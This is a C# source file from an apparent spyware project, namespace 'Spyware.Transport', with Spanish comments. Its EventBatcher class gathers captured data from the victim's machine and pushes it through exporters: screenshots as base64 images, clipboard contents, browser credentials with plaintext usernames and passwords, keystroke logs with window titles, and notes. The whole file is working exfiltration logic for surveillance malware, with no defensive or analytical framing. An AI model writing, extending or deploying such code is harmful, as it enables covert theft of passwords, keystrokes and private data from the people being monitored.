using Spyware.Core.Configuration;
using Spyware.Core.Logging;
using Spyware.Storage;

namespace Spyware.Transport;

public sealed class EventBatcher : IDisposable
{
    private readonly LocalEventRepository _repository;
    private readonly IReadOnlyList<IEventExporter> _exporters;
    private readonly TransportSection _config;
    private readonly ILog _log;
    private readonly string _agentId;

    public EventBatcher(string agentId, LocalEventRepository repository,
                        IReadOnlyList<IEventExporter> exporters, TransportSection config, ILog log)
    {
        _agentId = agentId;
        _repository = repository;
        _exporters = exporters;
        _config = config;
        _log = log;
    }

    public int Flush()
    {
        if (_exporters.Count == 0) return 0;

        int exported = 0;
        exported += FlushScreenshots();
        exported += FlushClipboard();
        exported += FlushCredentials();
        exported += FlushKeystrokes();
        exported += FlushNotes();

        if (exported > 0)
            _log.Info($"Ciclo de transporte: {exported} eventos marcados como exportados.");

        return exported;
    }

    private int FlushScreenshots()
    {
        IReadOnlyList<ScreenshotRow> rows = _repository.GetUnsentScreenshots(_config.BatchSize);
        if (rows.Count == 0) return 0;

        var events = new List<IReadOnlyDictionary<string, object?>>(rows.Count);
        foreach (ScreenshotRow row in rows) events.Add(Build(row));

        if (!TryExport(events)) return 0;

        _repository.MarkScreenshotsSent(rows.Select(r => r.Id));
        return rows.Count;
    }

    private int FlushClipboard()
    {
        IReadOnlyList<ClipboardRow> rows = _repository.GetUnsentClipboard(_config.BatchSize);
        if (rows.Count == 0) return 0;

        var events = new List<IReadOnlyDictionary<string, object?>>(rows.Count);
        foreach (ClipboardRow row in rows) events.Add(Build(row));

        if (!TryExport(events)) return 0;

        _repository.MarkClipboardSent(rows.Select(r => r.Id));
        return rows.Count;
    }

    private int FlushCredentials()
    {
        IReadOnlyList<CredentialRow> rows = _repository.GetUnsentCredentials(_config.BatchSize);
        if (rows.Count == 0) return 0;

        var events = new List<IReadOnlyDictionary<string, object?>>(rows.Count);
        foreach (CredentialRow row in rows) events.Add(Build(row));

        if (!TryExport(events)) return 0;

        _repository.MarkCredentialsSent(rows.Select(r => r.Id));
        return rows.Count;
    }

    private int FlushKeystrokes()
    {
        IReadOnlyList<KeystrokeRow> rows = _repository.GetUnsentKeystrokes(_config.BatchSize);
        if (rows.Count == 0) return 0;

        var events = new List<IReadOnlyDictionary<string, object?>>(rows.Count);
        foreach (KeystrokeRow row in rows) events.Add(Build(row));

        if (!TryExport(events)) return 0;

        _repository.MarkKeysSent(rows.Select(r => r.Id));
        return rows.Count;
    }

    private int FlushNotes()
    {
        IReadOnlyList<NoteRow> rows = _repository.GetUnsentNotes(_config.BatchSize);
        if (rows.Count == 0) return 0;

        var events = new List<IReadOnlyDictionary<string, object?>>(rows.Count);
        foreach (NoteRow row in rows) events.Add(Build(row));

        if (!TryExport(events)) return 0;

        _repository.MarkNotesSent(rows.Select(r => r.Id));
        return rows.Count;
    }

    private IReadOnlyDictionary<string, object?> Build(ScreenshotRow row)
    {
        var payload = new Dictionary<string, object?>
        {
            ["path"] = row.Path,
            ["width"] = row.Width,
            ["height"] = row.Height,
            ["hash"] = row.Hash,
            ["bytes"] = row.Bytes,
            ["display_count"] = row.DisplayCount,
            ["desktop_locked"] = row.DesktopLocked
        };

        if (_config.IncludeImagesInExport && File.Exists(row.Path))
            payload["image_base64"] = Convert.ToBase64String(File.ReadAllBytes(row.Path));
        else if (_config.IncludeImagesInExport)
            payload["image_missing"] = true;

        return Event("screenshot", row.TimestampUtc, row.Id, payload);
    }

    private IReadOnlyDictionary<string, object?> Build(ClipboardRow row) =>
        Event("clipboard", row.TimestampUtc, row.Id, new Dictionary<string, object?>
        {
            ["format"] = row.Format,
            ["content"] = row.Content,
            ["file_path"] = row.FilePath,
            ["length"] = row.Length,
            ["hash"] = row.Hash
        });

    private IReadOnlyDictionary<string, object?> Build(CredentialRow row) =>
        Event("credential", row.TimestampUtc, row.Id, new Dictionary<string, object?>
        {
            ["browser"] = row.Browser,
            ["profile"] = row.Profile,
            ["url"] = row.Url,
            ["username"] = row.Username,
            ["password"] = row.Password,
            ["status"] = row.Status,
            ["password_encrypted_base64"] = row.EncryptedBlob,
            ["created_at"] = row.CreatedAt,
            ["last_used_at"] = row.LastUsedAt
        });

    private static IReadOnlyDictionary<string, object?> Build(KeystrokeRow row) =>
        Event("keystroke", row.TimestampUtc, row.Id, new Dictionary<string, object?>
        {
            ["started_utc"] = row.StartedUtc,
            ["window_title"] = row.WindowTitle,
            ["process_name"] = row.ProcessName,
            ["text"] = row.Text,
            ["key_count"] = row.KeyCount,
            ["char_count"] = row.CharCount,
            ["truncated"] = row.Truncated,
            ["hash"] = row.Hash,
            ["file_path"] = row.FilePath
        });

    private static IReadOnlyDictionary<string, object?> Build(NoteRow row) =>
        Event("note", row.TimestampUtc, row.Id, new Dictionary<string, object?>
        {
            ["source"] = row.Source,
            ["store"] = row.Store,
            ["note_id"] = row.NoteId,
            ["text"] = row.Text,
            ["format"] = row.Format,
            ["status"] = row.Status,
            ["failure_reason"] = row.FailureReason,
            ["length"] = row.Length,
            ["hash"] = row.Hash,
            ["deleted"] = row.Deleted,
            ["created_at"] = row.CreatedAt,
            ["last_modified"] = row.UpdatedAt
        });

    private static Dictionary<string, object?> Event(string type, DateTime timestampUtc, long id, Dictionary<string, object?> payload) =>
        new()
        {
            ["event_id"] = id,
            ["type"] = type,
            ["timestamp"] = timestampUtc.ToString("o"),
            ["payload"] = payload
        };

    /// <summary>
    /// El exportador primario (local) manda: si él tuvo éxito, el evento ya está
    /// duplicado en disco y se marca sent. Los demás son mejor esfuerzo.
    /// </summary>
    private bool TryExport(IReadOnlyList<IReadOnlyDictionary<string, object?>> events)
    {
        bool primary = false;

        for (int i = 0; i < _exporters.Count; i++)
        {
            try
            {
                bool ok = _exporters[i].Export(_agentId, events);
                if (i == 0) primary = ok;
            }
            catch (Exception ex)
            {
                _log.Error($"El exportador {_exporters[i].Name} lanzó una excepción.", ex);
            }
        }

        return primary;
    }

    public void Dispose()
    {
        foreach (IDisposable disposable in _exporters.OfType<IDisposable>())
            disposable.Dispose();
    }
}
